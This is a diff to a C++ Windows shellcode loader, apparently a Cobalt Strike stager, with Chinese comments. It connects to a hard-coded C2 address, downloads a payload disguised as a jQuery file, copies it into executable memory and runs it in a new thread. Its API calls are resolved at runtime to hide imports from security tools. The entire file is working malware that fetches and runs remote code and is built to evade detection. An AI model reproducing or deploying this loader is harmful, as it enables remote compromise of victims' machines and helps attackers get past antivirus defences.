@@ -2,7 +2,6 @@
 #include <Windows.h>
 #include <stdio.h>
 #include <Wininet.h>
-
 using namespace std;
 #pragma comment(lib,"wininet")
 typedef _Ret_maybenull_ _Post_writable_byte_size_(dwSize) LPVOID(WINAPI* PVA)(
@@ -29,13 +28,13 @@ int main(int argc, char* argv[]) {
             return 0;
         } 
         char* host = (char*)"192.168.211.129";//cs的ip
-        HINTERNET Session = InternetConnectA(nethandle, host, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+        HINTERNET Session = InternetConnectA(nethandle, host, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);//使用https加密传输
         if (Session == NULL)
         {
             printf("internet connect error:%d\n", GetLastError());
             return 0;
         }
-        HINTERNET HttpRequest = HttpOpenRequestA(Session, "GET", "/jquery-3.3.2.slim.min.js", "HTTP/1.0", NULL, NULL, INTERNET_FLAG_DONT_CACHE, 0);//通过get请求profile文件中的url地址
+        HINTERNET HttpRequest = HttpOpenRequestA(Session, "GET", "/jquery-3.3.2.slim.min.js", "HTTP/1.0", NULL, NULL, INTERNET_FLAG_DONT_CACHE, 0);//通过get请求profile文件中64位的url地址
         if (HttpRequest == NULL) {
             printf("http open request error:%d\n", GetLastError());
             return 0;
@@ -63,7 +62,8 @@ int main(int argc, char* argv[]) {
             printf("%d please retry\n", scode);
             return 0;
         }
-        PVA VA = (PVA)GetProcAddress(LoadLibraryA("kernel32.dll"), "VirtualAlloc");
+        PVA VA = (PVA)GetProcAddress(LoadLibraryA("kernel32.dll"), "VirtualAlloc");//分配内存
+        //PVA VA = (PVA)GetProcAddress(LoadLibraryA("kernel32.dll"), "VirtualAlloc2");//win10可以使用这个函数
         if (VA = NULL) {
             printf("get function error:%d\n", GetLastError());
             return 0;
@@ -77,12 +77,12 @@ int main(int argc, char* argv[]) {
             printf("htttpqueryinfo error:%d\n", GetLastError());
             return 0;
         }
-        void* c = VirtualAlloc(NULL, length + 1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        void* c = VA(NULL, length + 1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);//保存获取的文件，实现加载器
         int readed = 0;
         InternetReadFile(HttpRequest, c, length + 1, (LPDWORD)&readed);
         char* cc = (char*)c + 11;//跳过配置文件前面追加字符
         PCT ppct=(PCT)GetProcAddress(LoadLibraryA("kernel32.dll"), "CreateThread");//隐藏导入api函数
-        HANDLE ct = ppct(NULL, 0, (LPTHREAD_START_ROUTINE)cc, NULL, 0, NULL);
+        HANDLE ct = ppct(NULL, 0, (LPTHREAD_START_ROUTINE)cc, NULL, 0, NULL);//执行
         WaitForSingleObject(ct, INFINITE);
         VirtualFree(c, length + 1, MEM_DECOMMIT);
     }
